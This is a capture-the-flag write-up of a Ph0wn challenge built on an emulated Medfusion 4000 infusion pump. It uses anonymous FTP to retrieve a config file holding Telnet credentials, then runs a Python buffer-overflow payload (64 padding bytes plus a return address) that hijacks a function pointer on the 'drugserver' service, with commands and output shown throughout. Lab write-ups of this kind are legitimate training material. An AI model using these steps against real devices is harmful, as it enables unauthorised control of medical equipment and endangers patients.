# Step 1

Read [Remote Code Execution on the Smiths Medical Medfusion 4000](https://github.com/sgayou/medfusion-4000-research/blob/master/doc/README.md).

Understand you need to ftp. Use `anonymous` account and `passive` mode.

```
$ ftp 34.79.161.43
Connected to 34.79.161.43
220 RTCS Ready
Name (34.79.161.43:axelle): anonymous
331 Looking up password
Password:
230 Login successful
Remote system type is Unix.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (34,140,103,157,117,48).
150 Opening ASCII mode data connection.
-rw-r--r-- 1 root root 211 Oct 21 09:43 CONFIG.XML
226 Directory send OK
ftp> get CONFIG.XML
local: CONFIG.XML remote: CONFIG.XML
227 Entering Passive Mode (34,140,103,157,117,48).
150 Opening data connection for RETR.
WARNING! 8 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
211 bytes received in 0.00 secs (1.5479 MB/s)
```

In `CONFIG.XML`, read Telnet credentials:

```xml
<?xml version="1.0"?>
<Medfusion3600Configuration>
  <TelnetInterface>
    <Port>23</Port>
    <Username>medfusion</Username>
    <Password>chu_ph0wn</Password>
 </TelnetInterface>
</Medfusion3600Configuration>
```

Connect via Telnet:

```
$ telnet  34.79.161.43
Trying 34.79.161.43...
Connected to 34.79.161.43.
Escape character is '^]'.
RTCS v2.96.00 Telnet server

Welcome to the Medfusion 4000 Configuration Interface


medfusion login: medfusion
Password: 
Linux medfusion 4.19.0-17-cloud-amd64 #1 SMP Debian 4.19.194-1 (2021-06-10) x86_64
 
4000>ls
copy_of_drugserver  flag1.txt  test.sh
4000>cat flag1.txt
ph0wn{so_you_are_r00t_step1_yo!}
```

# Step 2

There is a script `./test.sh`:

```
4000>./test.sh
Testing therapy...
therapy is at 0x7fe750000b60, f is at 0x7fe750000ba0 (diff=64) - heading to fp=0x401551
----- INFUSION PUMP THERAPY CONFIG ----
-              Aspirin: 41 mL
----------------------------------------
```

This script calls `/usr/bin/mds`, which is a default script also mentioned by the Remote Code Execution doc. It is a shell script which connects to a remote drugserver on port 7777.

There are 3 commands:

1. therapy
2. secret
3. help

Obviously, we need to get access to the `secret ` command.
The program provides us with memory addresses + we have a copy of the remote executable in `/home/medfusion`. We probably have to exploit it.

We need to retrieve the executable. Over Telnet, there is no file transfer.
So, we can use base64 encoding.

```
4000>base64 copy_of_drugserver
```

And then, on the remote end: `base64 -d drugserver.copy > drugserver`.
The file is an ELF x86-64 executable.

```
$ file drugserver
drugserver: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b935eaef8396248c3c5eb438e0e85847f9992720, for GNU/Linux 3.2.0, not stripped
```

We write an exploit for it. See `exploit.py`. The issue is that the therapy identifier variable overflows to a function pointer used to call this or that command. We overflow so that `secret()` is called.

Now, we need to do the same, but on the infusion pump.
Fortunately, python3 is installed.


```python
$ python3
Python 3.9.2 (default, Feb 28 2021, 17:03:44) 
[GCC 10.2.1 20210110] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> payload=b'A'*64
>>> payload = payload + b'\xbe\x19\x40\x00'
>>> import socket
>>> s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
>>> s.connect(('drugserver', 7777))
>>> s.sendall(b'therapy '+payload)
>>> data = s.recv(1024)
>>> print(data)
b'therapy is at 0x7fe750000d40, f is at 0x7fe750000d80 (diff=64) - heading to fp=0x40199e\nThis is the Secret Therapy ID: 0d1b344e5b{152c4e50222c4f601b2c4f5b182c3f591837}'
>>> s.sendall(b'therapy 0d1b344e5b{152c4e50222c4f601b2c4f5b182c3f591837}')
>>> data = s.recv(1024)
>>> print(data.decode())
therapy is at 0x7fe750000d40, f is at 0x7fe750000d80 (diff=64) - heading to fp=0x401551
----- INFUSION PUMP THERAPY CONFIG ----
-          Paracetamol: 43 mL
-              Heparin: 18 mL
-                0mega: 29 mL
-              Wynzora: 12 mL
-              Nasonex: 16 mL
{
-        Bromocriptine: 42 mL
-            Estradiol: 21 mL
-              Wynzora: 38 mL
-              Aspirin: 17 mL
-              Relafen: 50 mL
-            Estradiol: 02 mL
-            +Solupred: 20 mL
-              Topamax: 37 mL
-              Heparin: 12 mL
-            Estradiol: 47 mL
-            +Solupred: 38 mL
-              Nasonex: 14 mL
-            Estradiol: 47 mL
-            Estradiol: 42 mL
-        Desloratadine: 49 mL
-            Lidocaine: 49 mL
-            Estradiol: 29 mL
-            Singulair: 40 mL
}
----------------------------------------
```

The solution should be easy to find, as there are some `{` and `}`: the first letter of each medicine. `PH0WN{BEWARE+THE+NEEDLES}`.
